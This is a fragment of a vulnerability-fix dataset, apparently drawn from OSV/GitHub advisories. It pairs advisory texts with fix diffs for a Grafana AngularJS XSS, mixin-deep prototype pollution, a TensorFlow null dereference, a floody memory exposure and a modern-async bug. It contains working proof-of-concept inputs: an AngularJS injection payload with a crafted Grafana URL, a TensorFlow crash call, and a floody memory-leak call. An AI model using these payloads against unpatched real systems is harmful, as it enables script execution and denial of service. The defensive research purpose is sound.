('https:\/\/buddypress.svn.wordpress.org\/trunk@12549', 'URL', ''), ('cdf35c40', 'SHA', 'generic_sha'), ('0c9da1808c22', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/bp-core\/admin\/bp-core-admin-slugs.php'])","num_files":1.0},{"index":268,"vuln_id":"GHSA-3j9m-hcv9-rpj8","cwe_id":"{'CWE-79'}","score":6.9,"chain":"{'https:\/\/github.com\/grafana\/grafana\/commit\/3cb5214fa45eb5a571fd70d6c6edf0d729983f82', 'https:\/\/github.com\/grafana\/grafana\/commit\/fb85ed691290d211a5baa44d9a641ab137f0de88', 'https:\/\/github.com\/grafana\/grafana\/commit\/31b78d51c693d828720a5b285107a50e6024c912'}","dataset":"osv","summary":"XSS vulnerability allowing arbitrary JavaScript execution Today we are releasing Grafana 8.2.3. This patch release includes an important security fix for an issue that affects all Grafana versions from 8.0.0-beta1.\n\n[Grafana Cloud](https:\/\/grafana.com\/cloud) instances have already been patched and an audit did not find any usage of this attack vector. [Grafana Enterprise](https:\/\/grafana.com\/products\/enterprise) customers were provided with updated binaries under embargo.\n\n## CVE-2021-41174 XSS vulnerability on unauthenticated pages\n\n### Summary\n\nCVSS Score: 6.9 Medium\nCVSS:[CVSS:3.0\/AV:N\/AC:H\/PR:N\/UI:R\/S:C\/C:L\/I:H\/A:N\/E:U\/RL:O\/RC:R\/CR:L\/MAV:N\/MAC:H\/MPR:N\/MUI:R\/MS:C\/MC:N\/MI:H\/MA:L](https:\/\/www.first.org\/cvss\/calculator\/3.0#CVSS:3.0\/AV:N\/AC:H\/PR:N\/UI:R\/S:C\/C:L\/I:H\/A:N\/E:U\/RL:O\/RC:R\/CR:L\/MAV:N\/MAC:H\/MPR:N\/MUI:R\/MS:C\/MC:N\/MI:H\/MA:L)\n\nWe received a security report to security@grafana.com on 2021-10-21 about a vulnerability in Grafana regarding the XSS vulnerability.\n\nIt was later identified as affecting Grafana versions from 8.0.0-beta1 to 8.2.2. [CVE-2021-41174](https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2021-41174) has been assigned to this vulnerability.\n\n### Impact\n\nIf an attacker is able to convince a victim to visit a URL referencing a vulnerable page, arbitrary JavaScript content may be executed within the context of the victim's browser.\n\nThe user visiting the malicious link must be unauthenticated and the link must be for a page that contains the login button in the menu bar.\n\nThere are two ways an unauthenticated user can open a page in Grafana that contains the login button:\n- Anonymous authentication is enabled. This means all pages in Grafana would be open for the attack.\n- The link is to an unauthenticated page. The following pages are vulnerable:\n  - `\/dashboard-solo\/snapshot\/*`\n  - `\/dashboard\/snapshot\/*`\n  - `\/invite\/:code`\n\nThe url has to be crafted to exploit AngularJS rendering and contain the interpolation binding for AngularJS expressions. AngularJS uses double curly braces for interpolation binding: {{ }} \n\nAn example of an expression would be: `{{constructor.constructor(\u2018alert(1)\u2019)()}}`. This can be included in the link URL like this: \n\nhttps:\/\/play.grafana.org\/dashboard\/snapshot\/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D?orgId=1\n\nWhen the user follows the link and the page renders, the login button will contain the original link with a query parameter to force a redirect to the login page. The URL is not validated and the AngularJS rendering engine will execute the JavaScript expression contained in the URL.\n\n### Attack audit\n\nWe can not guarantee that the below will identify all attacks, so if you find something using the audit process described below, you should consider doing a full assessment.\n\n#### Through reverse proxy\/load balancer logs\n\nTo determine if your Grafana installation has been exploited for this vulnerability, search through your reverse proxy\/load balancer access logs for instances where the path contains `{{` followed by something that would invoke JavaScript code. For example, this could be code that attempts to show a fake login page or to steal browser or session data. The [OWASP cheat sheet](https:\/\/cheatsheetseries.owasp.org\/cheatsheets\/XSS_Filter_Evasion_Cheat_Sheet.html) has several examples of XSS attacks.\n\n#### Through the Grafana Enterprise audit feature\n\nIf you enabled \u201cLog web requests\u201d in your configuration with `router_logging = true`, look for requests where `path` contains `{{` followed by something that would invoke JavaScript code.\n\n### Patched versions\n\nRelease 8.2.3:\n\n- [Download Grafana 8.2.3](https:\/\/grafana.com\/grafana\/download\/8.2.3)\n- [Release notes](https:\/\/grafana.com\/docs\/grafana\/latest\/release-notes\/release-notes-8-2-3\/)\n\n### Solutions and mitigations\n\nDownload and install the appropriate patch for your version of Grafana.\n\n[Grafana Cloud](https:\/\/grafana.com\/cloud) instances have already been patched, and [Grafana Enterprise](https:\/\/grafana.com\/products\/enterprise) customers were provided with updated binaries under embargo.\n\n### Workaround\n\nIf for some reason you cannot upgrade, you can use a reverse proxy or similar to block access to block the literal string `{{` in the path.\n\nExample of an Nginx rule to block the literal string `{{`:\n\n```\nlocation ~ \\{\\{ {\n    deny all;\n}\n```\n### Timeline and postmortem\n\nHere is a detailed timeline starting from when we originally learned of the issue. All times in UTC. \n\n* 2021-10-21 23:13: Security researcher sends the initial report about an XSS vulnerability.\n* 2021-10-21 23:13: Confirmed to be reproducible in at least versions 8.0.5 and 8.2.2.\n* 2021-10-22 02:02 MEDIUM severity declared.\n* 2021-10-22 09:22: it is discovered that Grafana instances with anonymous auth turned on are vulnerable. This includes https:\/\/play.grafana.org\/ .\n* 2021-10-22 09:50: Anonymous access disabled for all instances on Grafana Cloud as a mitigation measure.\n* 2021-10-22 11:15: Workaround deployed on Grafana Cloud that blocks malicious requests.\n* 2021-10-22 12:35: Enabled anonymous access for instances on Grafana Cloud. \n* 2021-10-22 12:51: All instances protected by the workaround. From this point forward, Grafana Cloud is no longer affected.\n* 2021-10-22 14:05 Grafana Cloud instances updated with a fix.\n* 2021-10-22 19:23 :Determination that no weekend work is needed as the issue is of MEDIUM severity and the root cause has been identified.\n* 2021-10-25 14:13: Audit of Grafana Cloud concluded, no evidence of exploitation.\n* 2021-10-27 12:00: Grafana Enterprise images released to customers under embargo.\n* 2021-11-03 12:00: Public release.\n\n## Reporting security issues\n\nIf you think you have found a security vulnerability, please send a report to [security@grafana.com](mailto:security@grafana.com). This address can be used for all of\nGrafana Labs' open source and commercial products (including but not limited to Grafana, Tempo, Loki, k6, Tanka, and  Grafana Cloud, Grafana Enterprise, and grafana.com). We only accept vulnerability reports at this address. We would prefer that you encrypt your message to us using our PGP key. The key fingerprint is:\n\nF988 7BEA 027A 049F AE8E  5CAA D125 8932 BE24 C5CA\n\nThe key is available from [ keyserver.ubuntu.com]( https:\/\/keyserver.ubuntu.com\/pks\/lookup?op=get&fingerprint=on&search=0xD1258932BE24C5CA) by searching for [security@grafana]( https:\/\/keyserver.ubuntu.com\/pks\/lookup?search=security@grafana&fingerprint=on&op=index).\n\n## Security announcements\n\nThere is a Security [category](https:\/\/grafana.com\/tags\/security\/) on the Grafana blog where we will post a summary, remediation, and mitigation details for any patch containing security fixes and you can subscribe to updates from our [Security Announcements RSS feed](https:\/\/grafana.com\/tags\/security\/index.xml).","published_date":"2021-11-08","chain_len":3,"project":"https:\/\/github.com\/grafana\/grafana","commit_href":"https:\/\/github.com\/grafana\/grafana\/commit\/3cb5214fa45eb5a571fd70d6c6edf0d729983f82","commit_sha":"3cb5214fa45eb5a571fd70d6c6edf0d729983f82","patch":"MULTI","chain_ord":"['31b78d51c693d828720a5b285107a50e6024c912', '3cb5214fa45eb5a571fd70d6c6edf0d729983f82', 'fb85ed691290d211a5baa44d9a641ab137f0de88']","before_first_fix_commit":"{'3cb5214fa45eb5a571fd70d6c6edf0d729983f82', 'a3dc30546fce2e437d858c140f1ff307a04365d6'}","last_fix_commit":"fb85ed691290d211a5baa44d9a641ab137f0de88","chain_ord_pos":2.0,"commit_datetime":"10\/25\/2021, 07:16:51","message":"Merge pull request #151 from grafana\/dcech\/sanitize-replaceAll\n\nuse global replace when sanitizing urls in 8.2.3","author":"Dimitris Sotirakis","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'packages\/grafana-data\/src\/text\/sanitize.ts': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/grafana\/grafana\/raw\/3cb5214fa45eb5a571fd70d6c6edf0d729983f82\/packages%2Fgrafana-data%2Fsrc%2Ftext%2Fsanitize.ts', 'patch': \"@@ -40,5 +40,5 @@ export function escapeHtml(str: string): string {\\n }\\n \\n export function sanitizeAngularInterpolation(url: string): string {\\n-  return url.replace('{{', '%7B%7B').replace('}}', '%7D%7D');\\n+  return url.replace(\/\\\\{\\\\{\/g, '%7B%7B').replace(\/\\\\}\\\\}\/g, '%7D%7D');\\n }\"}}","message_norm":"merge pull request #151 from grafana\/dcech\/sanitize-replaceall\n\nuse global replace when sanitizing urls in 8.2.3","language":"en","entities":"[('#151', 'ISSUE', ''), ('sanitize', 'SECWORD', ''), ('sanitizing', 'SECWORD', ''), ('8.2.3', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/grafana-data\/src\/text\/sanitize.ts'])","num_files":1.0},{"index":269,"vuln_id":"GHSA-3j9m-hcv9-rpj8","cwe_id":"{'CWE-79'}","score":6.9,"chain":"{'https:\/\/github.com\/grafana\/grafana\/commit\/3cb5214fa45eb5a571fd70d6c6edf0d729983f82', 'https:\/\/github.com\/grafana\/grafana\/commit\/fb85ed691290d211a5baa44d9a641ab137f0de88', 'https:\/\/github.com\/grafana\/grafana\/commit\/31b78d51c693d828720a5b285107a50e6024c912'}","dataset":"osv","summary":"XSS vulnerability allowing arbitrary JavaScript execution Today we are releasing Grafana 8.2.3. This patch release includes an important security fix for an issue that affects all Grafana versions from 8.0.0-beta1.\n\n[Grafana Cloud](https:\/\/grafana.com\/cloud) instances have already been patched and an audit did not find any usage of this attack vector. [Grafana Enterprise](https:\/\/grafana.com\/products\/enterprise) customers were provided with updated binaries under embargo.\n\n## CVE-2021-41174 XSS vulnerability on unauthenticated pages\n\n### Summary\n\nCVSS Score: 6.9 Medium\nCVSS:[CVSS:3.0\/AV:N\/AC:H\/PR:N\/UI:R\/S:C\/C:L\/I:H\/A:N\/E:U\/RL:O\/RC:R\/CR:L\/MAV:N\/MAC:H\/MPR:N\/MUI:R\/MS:C\/MC:N\/MI:H\/MA:L](https:\/\/www.first.org\/cvss\/calculator\/3.0#CVSS:3.0\/AV:N\/AC:H\/PR:N\/UI:R\/S:C\/C:L\/I:H\/A:N\/E:U\/RL:O\/RC:R\/CR:L\/MAV:N\/MAC:H\/MPR:N\/MUI:R\/MS:C\/MC:N\/MI:H\/MA:L)\n\nWe received a security report to security@grafana.com on 2021-10-21 about a vulnerability in Grafana regarding the XSS vulnerability.\n\nIt was later identified as affecting Grafana versions from 8.0.0-beta1 to 8.2.2. [CVE-2021-41174](https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2021-41174) has been assigned to this vulnerability.\n\n### Impact\n\nIf an attacker is able to convince a victim to visit a URL referencing a vulnerable page, arbitrary JavaScript content may be executed within the context of the victim's browser.\n\nThe user visiting the malicious link must be unauthenticated and the link must be for a page that contains the login button in the menu bar.\n\nThere are two ways an unauthenticated user can open a page in Grafana that contains the login button:\n- Anonymous authentication is enabled. This means all pages in Grafana would be open for the attack.\n- The link is to an unauthenticated page. The following pages are vulnerable:\n  - `\/dashboard-solo\/snapshot\/*`\n  - `\/dashboard\/snapshot\/*`\n  - `\/invite\/:code`\n\nThe url has to be crafted to exploit AngularJS rendering and contain the interpolation binding for AngularJS expressions. AngularJS uses double curly braces for interpolation binding: {{ }} \n\nAn example of an expression would be: `{{constructor.constructor(\u2018alert(1)\u2019)()}}`. This can be included in the link URL like this: \n\nhttps:\/\/play.grafana.org\/dashboard\/snapshot\/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D?orgId=1\n\nWhen the user follows the link and the page renders, the login button will contain the original link with a query parameter to force a redirect to the login page. The URL is not validated and the AngularJS rendering engine will execute the JavaScript expression contained in the URL.\n\n### Attack audit\n\nWe can not guarantee that the below will identify all attacks, so if you find something using the audit process described below, you should consider doing a full assessment.\n\n#### Through reverse proxy\/load balancer logs\n\nTo determine if your Grafana installation has been exploited for this vulnerability, search through your reverse proxy\/load balancer access logs for instances where the path contains `{{` followed by something that would invoke JavaScript code. For example, this could be code that attempts to show a fake login page or to steal browser or session data. The [OWASP cheat sheet](https:\/\/cheatsheetseries.owasp.org\/cheatsheets\/XSS_Filter_Evasion_Cheat_Sheet.html) has several examples of XSS attacks.\n\n#### Through the Grafana Enterprise audit feature\n\nIf you enabled \u201cLog web requests\u201d in your configuration with `router_logging = true`, look for requests where `path` contains `{{` followed by something that would invoke JavaScript code.\n\n### Patched versions\n\nRelease 8.2.3:\n\n- [Download Grafana 8.2.3](https:\/\/grafana.com\/grafana\/download\/8.2.3)\n- [Release notes](https:\/\/grafana.com\/docs\/grafana\/latest\/release-notes\/release-notes-8-2-3\/)\n\n### Solutions and mitigations\n\nDownload and install the appropriate patch for your version of Grafana.\n\n[Grafana Cloud](https:\/\/grafana.com\/cloud) instances have already been patched, and [Grafana Enterprise](https:\/\/grafana.com\/products\/enterprise) customers were provided with updated binaries under embargo.\n\n### Workaround\n\nIf for some reason you cannot upgrade, you can use a reverse proxy or similar to block access to block the literal string `{{` in the path.\n\nExample of an Nginx rule to block the literal string `{{`:\n\n```\nlocation ~ \\{\\{ {\n    deny all;\n}\n```\n### Timeline and postmortem\n\nHere is a detailed timeline starting from when we originally learned of the issue. All times in UTC. \n\n* 2021-10-21 23:13: Security researcher sends the initial report about an XSS vulnerability.\n* 2021-10-21 23:13: Confirmed to be reproducible in at least versions 8.0.5 and 8.2.2.\n* 2021-10-22 02:02 MEDIUM severity declared.\n* 2021-10-22 09:22: it is discovered that Grafana instances with anonymous auth turned on are vulnerable. This includes https:\/\/play.grafana.org\/ .\n* 2021-10-22 09:50: Anonymous access disabled for all instances on Grafana Cloud as a mitigation measure.\n* 2021-10-22 11:15: Workaround deployed on Grafana Cloud that blocks malicious requests.\n* 2021-10-22 12:35: Enabled anonymous access for instances on Grafana Cloud. \n* 2021-10-22 12:51: All instances protected by the workaround. From this point forward, Grafana Cloud is no longer affected.\n* 2021-10-22 14:05 Grafana Cloud instances updated with a fix.\n* 2021-10-22 19:23 :Determination that no weekend work is needed as the issue is of MEDIUM severity and the root cause has been identified.\n* 2021-10-25 14:13: Audit of Grafana Cloud concluded, no evidence of exploitation.\n* 2021-10-27 12:00: Grafana Enterprise images released to customers under embargo.\n* 2021-11-03 12:00: Public release.\n\n## Reporting security issues\n\nIf you think you have found a security vulnerability, please send a report to [security@grafana.com](mailto:security@grafana.com). This address can be used for all of\nGrafana Labs' open source and commercial products (including but not limited to Grafana, Tempo, Loki, k6, Tanka, and  Grafana Cloud, Grafana Enterprise, and grafana.com). We only accept vulnerability reports at this address. We would prefer that you encrypt your message to us using our PGP key. The key fingerprint is:\n\nF988 7BEA 027A 049F AE8E  5CAA D125 8932 BE24 C5CA\n\nThe key is available from [ keyserver.ubuntu.com]( https:\/\/keyserver.ubuntu.com\/pks\/lookup?op=get&fingerprint=on&search=0xD1258932BE24C5CA) by searching for [security@grafana]( https:\/\/keyserver.ubuntu.com\/pks\/lookup?search=security@grafana&fingerprint=on&op=index).\n\n## Security announcements\n\nThere is a Security [category](https:\/\/grafana.com\/tags\/security\/) on the Grafana blog where we will post a summary, remediation, and mitigation details for any patch containing security fixes and you can subscribe to updates from our [Security Announcements RSS feed](https:\/\/grafana.com\/tags\/security\/index.xml).","published_date":"2021-11-08","chain_len":3,"project":"https:\/\/github.com\/grafana\/grafana","commit_href":"https:\/\/github.com\/grafana\/grafana\/commit\/fb85ed691290d211a5baa44d9a641ab137f0de88","commit_sha":"fb85ed691290d211a5baa44d9a641ab137f0de88","patch":"MULTI","chain_ord":"['31b78d51c693d828720a5b285107a50e6024c912', '3cb5214fa45eb5a571fd70d6c6edf0d729983f82', 'fb85ed691290d211a5baa44d9a641ab137f0de88']","before_first_fix_commit":"{'3cb5214fa45eb5a571fd70d6c6edf0d729983f82', 'a3dc30546fce2e437d858c140f1ff307a04365d6'}","last_fix_commit":"fb85ed691290d211a5baa44d9a641ab137f0de88","chain_ord_pos":3.0,"commit_datetime":"10\/25\/2021, 07:45:05","message":"Merge pull request #147 from grafana\/axelav\/sanitized-nav-links-8-2-3\n\nSanitized NavBar children links to remove angular interpolation v8.2.3","author":"Oscar Kilhed","comments":null,"stats":"{'additions': 5, 'deletions': 3, 'total': 8}","files":"{'public\/app\/core\/components\/NavBar\/DropdownChild.tsx': {'additions': 5, 'deletions': 3, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/grafana\/grafana\/raw\/fb85ed691290d211a5baa44d9a641ab137f0de88\/public%2Fapp%2Fcore%2Fcomponents%2FNavBar%2FDropdownChild.tsx', 'patch': '@@ -1,6 +1,6 @@\\n import React from \\'react\\';\\n import { css } from \\'@emotion\/css\\';\\n-import { GrafanaTheme2 } from \\'@grafana\/data\\';\\n+import { GrafanaTheme2, textUtil } from \\'@grafana\/data\\';\\n import { Icon, IconName, Link, useTheme2 } from \\'@grafana\/ui\\';\\n \\n export interface Props {\\n@@ -29,13 +29,15 @@ const DropdownChild = ({ isDivider = false, icon, onClick, target, text, url }:\\n     <\/button>\\n   );\\n   if (url) {\\n+    const sanitizedUrl = textUtil.sanitizeAngularInterpolation(url);\\n+\\n     element =\\n       !target && url.startsWith(\\'\/\\') ? (\\n-        <Link className={styles.element} onClick={onClick} href={url}>\\n+        <Link className={styles.element} onClick={onClick} href={sanitizedUrl}>\\n           {linkContent}\\n         <\/Link>\\n       ) : (\\n-        <a className={styles.element} href={url} target={target} rel=\"noopener\" onClick={onClick}>\\n+        <a className={styles.element} href={sanitizedUrl} target={target} rel=\"noopener\" onClick={onClick}>\\n           {linkContent}\\n         <\/a>\\n       );'}}","message_norm":"merge pull request #147 from grafana\/axelav\/sanitized-nav-links-8-2-3\n\nsanitized navbar children links to remove angular interpolation v8.2.3","language":"en","entities":"[('#147', 'ISSUE', ''), ('sanitized', 'SECWORD', ''), ('sanitized', 'SECWORD', ''), ('remove', 'ACTION', ''), ('v8.2.3', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['public\/app\/core\/components\/NavBar\/DropdownChild.tsx'])","num_files":1.0},{"index":277,"vuln_id":"GHSA-3mpr-hq3p-49h9","cwe_id":"{'CWE-471'}","score":0.0,"chain":"{'https:\/\/github.com\/jonschlinkert\/mixin-deep\/commit\/578b0bc5e74e14de9ef4975f504dc698796bdf9c'}","dataset":"osv","summary":"Prototype Pollution in mixin-deep Versions of `mixin-deep` before 1.3.1 are vulnerable to prototype pollution via merging functions.\n\n\n## Recommendation\n\nUpdate to version 1.3.1 or later.","published_date":"2018-07-26","chain_len":1,"project":"https:\/\/github.com\/jonschlinkert\/mixin-deep","commit_href":"https:\/\/github.com\/jonschlinkert\/mixin-deep\/commit\/578b0bc5e74e14de9ef4975f504dc698796bdf9c","commit_sha":"578b0bc5e74e14de9ef4975f504dc698796bdf9c","patch":"SINGLE","chain_ord":"['578b0bc5e74e14de9ef4975f504dc698796bdf9c']","before_first_fix_commit":"{'7705bdf88ff0263242c07c824d20526203876668'}","last_fix_commit":"578b0bc5e74e14de9ef4975f504dc698796bdf9c","chain_ord_pos":1.0,"commit_datetime":"02\/07\/2018, 16:04:06","message":"exclude __proto__","author":"doowb","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'index.js': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jonschlinkert\/mixin-deep\/raw\/578b0bc5e74e14de9ef4975f504dc698796bdf9c\/index.js', 'patch': \"@@ -23,6 +23,10 @@ function mixinDeep(target, objects) {\\n  *\/\\n \\n function copy(val, key) {\\n+  if (key === '__proto__') {\\n+    return;\\n+  }\\n+\\n   var obj = this[key];\\n   if (isObject(val) && isObject(obj)) {\\n     mixinDeep(obj, val);\"}}","message_norm":"exclude __proto__","language":"pt","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":279,"vuln_id":"GHSA-3mw4-6rj6-74g5","cwe_id":"{'CWE-476'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/53b0dd6dc5957652f35964af16b892ec9af4a559'}","dataset":"osv","summary":"Null pointer dereference in TensorFlow ### Impact \nThe [implementation of `QuantizedMaxPool`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/quantized_pooling_ops.cc#L114-L130) has an undefined behavior where user controlled inputs can trigger a reference binding to null pointer.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizedMaxPool(\n    input = tf.constant([[[[4]]]], dtype=tf.quint8),\n    min_input = [],\n    max_input = [1],\n    ksize = [1, 1, 1, 1],\n    strides = [1, 1, 1, 1],\n    padding = \"SAME\", name=None\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [53b0dd6dc5957652f35964af16b892ec9af4a559](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/53b0dd6dc5957652f35964af16b892ec9af4a559).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/53b0dd6dc5957652f35964af16b892ec9af4a559","commit_sha":"53b0dd6dc5957652f35964af16b892ec9af4a559","patch":"SINGLE","chain_ord":"['53b0dd6dc5957652f35964af16b892ec9af4a559']","before_first_fix_commit":"{'19cff800e5805097da69bb1ad0b0a2dd9f83741a'}","last_fix_commit":"53b0dd6dc5957652f35964af16b892ec9af4a559","chain_ord_pos":1.0,"commit_datetime":"12\/03\/2021, 18:02:20","message":"Fix nullptr exception in QuantizedMaxPool op when empty list is sent to min_input or max_input parameters.\n\nPiperOrigin-RevId: 413960973\nChange-Id: I9e3ded593f3c4eabf0d6d5dc356e6a19a3ad2682","author":"Isha Arkatkar","comments":null,"stats":"{'additions': 14, 'deletions': 0, 'total': 14}","files":"{'tensorflow\/core\/kernels\/quantized_pooling_ops.cc': {'additions': 14, 'deletions': 0, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/53b0dd6dc5957652f35964af16b892ec9af4a559\/tensorflow%2Fcore%2Fkernels%2Fquantized_pooling_ops.cc', 'patch': '@@ -15,6 +15,8 @@ limitations under the License.\\n \\n \/\/ See docs in ..\/ops\/nn_ops.cc.\\n \\n+#include \"tensorflow\/core\/framework\/op_requires.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n #define EIGEN_USE_THREADS\\n \\n #include \"third_party\/eigen3\/unsupported\/Eigen\/CXX11\/Tensor\"\\n@@ -117,6 +119,18 @@ class QuantizedMaxPoolingOp : public MaxPoolingOp<Device, T> {\\n       : MaxPoolingOp<Device, T>(context) {}\\n \\n   void Compute(OpKernelContext* context) override {\\n+    auto min_input_tensor = context->input(1);\\n+    auto max_input_tensor = context->input(2);\\n+    OP_REQUIRES(\\n+        context, min_input_tensor.NumElements() == 1,\\n+        errors::InvalidArgument(\\n+            \"min_input must be a scalar float value, got tensor with shape \",\\n+            min_input_tensor.shape()));\\n+    OP_REQUIRES(\\n+        context, max_input_tensor.NumElements() == 1,\\n+        errors::InvalidArgument(\\n+            \"max_input must be a scalar float value, got tensor with shape \",\\n+            max_input_tensor.shape()));\\n     const float min_input = context->input(1).flat<float>()(0);\\n     const float max_input = context->input(2).flat<float>()(0);\\n     MaxPoolingOp<Device, T>::Compute(context);'}}","message_norm":"fix nullptr exception in quantizedmaxpool op when empty list is sent to min_input or max_input parameters.\n\npiperorigin-revid: 413960973\nchange-id: i9e3ded593f3c4eabf0d6d5dc356e6a19a3ad2682","language":"en","entities":"[('fix', 'ACTION', ''), ('nullptr exception', 'SECWORD', ''), ('413960973', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_pooling_ops.cc'])","num_files":1.0},{"index":284,"vuln_id":"GHSA-3p92-886g-qxpq","cwe_id":"{'CWE-201'}","score":5.1,"chain":"{'https:\/\/github.com\/soldair\/node-floody\/commit\/6c44722312131f4ac8a1af40f0f861c85efe01b0'}","dataset":"osv","summary":"Remote Memory Exposure in floody Versions of `floody` before 0.1.1 are vulnerable to remote memory exposure.\n\n.write(number)` in the affected `floody` versions passes a number to Buffer constructor, appending a chunk of uninitialized memory.\n\nProof of Concept: \n\n```\nvar f = require('floody')(process.stdout); \nf.write(USERSUPPLIEDINPUT); \n'f.stop();\n\n\n## Recommendation\n\nUpdate to version 0.1.1 or later.","published_date":"2019-06-04","chain_len":1,"project":"https:\/\/github.com\/soldair\/node-floody","commit_href":"https:\/\/github.com\/soldair\/node-floody\/commit\/6c44722312131f4ac8a1af40f0f861c85efe01b0","commit_sha":"6c44722312131f4ac8a1af40f0f861c85efe01b0","patch":"SINGLE","chain_ord":"['6c44722312131f4ac8a1af40f0f861c85efe01b0']","before_first_fix_commit":"{'2a150c5552b8ce2f2a12ae4a3fd33882d5827afd'}","last_fix_commit":"6c44722312131f4ac8a1af40f0f861c85efe01b0","chain_ord_pos":1.0,"commit_datetime":"01\/15\/2016, 13:27:13","message":"adding fix for exposing uninitalized memory found by @chalker","author":"Ryan Day","comments":"{'com_1': {'author': 'ChALkeR', 'datetime': '01\/15\/2016, 20:42:58', 'body': \"POC: `var f = require('floody')(process.stdout); f.write(1000); f.stop();`.\"}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/soldair\/node-floody\/raw\/6c44722312131f4ac8a1af40f0f861c85efe01b0\/index.js', 'patch': \"@@ -28,7 +28,7 @@ module.exports = function(options){\\n \\n     if(writes.length > windowSize) writes.shift();\\n \\n-    data = data instanceof Buffer ? data : new Buffer(data);\\n+    data = data instanceof Buffer ? data : new Buffer(data+'');\\n     bufLen += data.length;\\n \\n     buf.push(data);\"}}","message_norm":"adding fix for exposing uninitalized memory found by @chalker","language":"en","entities":"[('adding', 'ACTION', ''), ('uninitalized memory', 'SECWORD', ''), ('found', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":287,"vuln_id":"GHSA-3pcq-34w5-p4g2","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/nicolas-van\/modern-async\/commit\/0010d28de1b15d51db3976080e26357fa7144436'}","dataset":"osv","summary":"forEachSeries and forEachLimit do not limit the number of requests ### Impact\n\nThis is a bug affecting two of the functions in this library: forEachSeries and forEachLimit. They should limit the concurrency of some actions but, in practice, they don't. Any code calling these functions will be written thinking they would limit the concurrency but they won't. This could lead to potential security issues in other projects.\n\n### Patches\n\nThe problem has been patched in 1.0.4.\n\n### Workarounds\n\nThere is no workaround aside from upgrading to 1.0.4.","published_date":"2021-10-21","chain_len":1,"project":"https:\/\/github.com\/nicolas-van\/modern-async","commit_href":"https:\/\/github.com\/nicolas-van\/modern-async\/commit\/0010d28de1b15d51db3976080e26357fa7144436","commit_sha":"0010d28de1b15d51db3976080e26357fa7144436","patch":"SINGLE","chain_ord":"['0010d28de1b15d51db3976080e26357fa7144436']","before_first_fix_commit":"{'7aa934294e59bc7359651a852e73bd5785b9b99b'}","last_fix_commit":"0010d28de1b15d51db3976080e26357fa7144436","chain_ord_pos":1.0,"commit_datetime":"10\/19\/2021, 21:22:02","message":"Fix #5","author":"Nicolas Vanhoren","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/forEachLimit.mjs': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nicolas-van\/modern-async\/raw\/0010d28de1b15d51db3976080e26357fa7144436\/src%2FforEachLimit.mjs', 'patch': \"@@ -35,7 +35,7 @@ import mapLimit from '.\/mapLimit.mjs'\\n  *\/\\n async function forEachLimit (iterable, iteratee, concurrency) {\\n   await mapLimit(iterable, async (v, i, t) => {\\n-    iteratee(v, i, t)\\n+    await iteratee(v, i, t)\\n   }, concurrency)\\n }\"}}","message_norm":"fix #5","language":"ca","entities":"[('fix', 'ACTION', ''), ('#5', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/forEachLimit.mjs'])","num_files":1.0},{"index":288,"vuln_id":"GHSA-3pg8-c473-w6rr","cwe_id":"{'CWE-79'}","score":6.9,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/3caa32334db0c277b84e993eaca2036f5d1dbef8'}","dataset":"osv","summary":"Stored Cross-site Scripting in showdoc ShowDoc is a tool for an IT team to share documents online. showdoc contains a stored cross-site scripting vulnerability in the File Library page when uploading a file in .ofd format in versions prior to 2.10.4. At this time, there is no known workaround. Users should update to version 